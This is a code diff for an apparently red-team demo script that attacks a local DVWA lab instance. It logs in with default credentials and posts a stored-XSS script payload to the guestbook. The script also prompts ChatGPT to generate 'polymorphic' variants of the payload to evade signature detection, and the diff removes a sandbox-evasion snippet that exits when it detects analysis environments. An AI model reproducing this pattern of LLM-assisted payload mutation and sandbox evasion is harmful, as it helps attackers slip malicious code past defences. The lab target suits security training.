@@ -29,23 +29,26 @@ class PointlessAI_advanced_evasion_techniques(DVWA_Session, ChatGPT_Func, Genera
 
     def polymorphic_code_generator(self, payload):
         # Use ChatGPT to suggest variations of the initial payload
-        guidance = "Generate a polymorphic version of this code to evade signature detection."
+        guidance = f"Generate a polymorphic version of this JS code to evade signature detection. {self.no_markdown}"
         polymorphic_payload = self.red_team_query(payload, guidance)
+        print(payload)
+        print(polymorphic_payload)
         return polymorphic_payload
-
-    def sandbox_evasion_tactics(self):
-        # Sample sandbox evasion snippet, detailed implementation involves checking for VM artifacts, mouse movements, etc.
-        evasion_code = """
-if "sand" in os.environ or len(os.listdir('/proc')) < 300:
-    sys.exit()
-"""
-        return evasion_code
 
     def exploit_dvwa(self, s, url, payload):
         # This method would exploit DVWA by sending the crafted payload, demonstrating evasion capabilities.
         encoded_payload = self.encode_payload(payload)
+        print(encoded_payload)
         decoded_payload = self.decode_payload(encoded_payload)
-        response = s.post(url, data={'input': decoded_payload})
+        print(decoded_payload)
+
+        url = "http://127.0.0.1/vulnerabilities/xss_s/"
+        xss_data = {
+            'txtName': 'Thankyou for your session id',
+            'mtxMessage': decoded_payload,
+            'btnSign': 'Sign+Guestbook'
+        }
+        response = s.post(url, data=xss_data)
         return response.text
 
     def run_advanced_evasion_techniques_demo(self):
@@ -53,15 +56,15 @@ if "sand" in os.environ or len(os.listdir('/proc')) < 300:
         with requests.Session() as s:
             user_token, cookies = self.get_csrf_token_and_cookie(s, self.get_constants())
             _ = self.login_to_dvwa(s, self.get_constants(), "admin", "password", user_token)
+            user_token, cookies = self.get_csrf_token_and_cookie(s, self.base_url+"/setup.php")
+            _ = self.setup_database(s, self.base_url+"/setup.php", user_token, cookies)
             
             # Demonstrating polymorphic code generation and sandbox evasion
-            original_payload = "echo 'This is a test.';"
-            polymorphic_payload = self.polymorphic_code_generator(original_payload)
-            evasion_code = self.sandbox_evasion_tactics()
-            combined_payload = polymorphic_payload + evasion_code
+            original_payload = "<script>alert('Session ID is 123456')</script>"
+            polymorphic_payload = self.polymorphic_code_generator(original_payload) # Returns polymorphic payload
             
             # Exploit the DVWA with the advanced evasion techniques applied to the payload
-            result = self.exploit_dvwa(s, self.sql_injection, combined_payload)
+            result = self.exploit_dvwa(s, self.sql_injection, polymorphic_payload)
             return result
 
 def main():
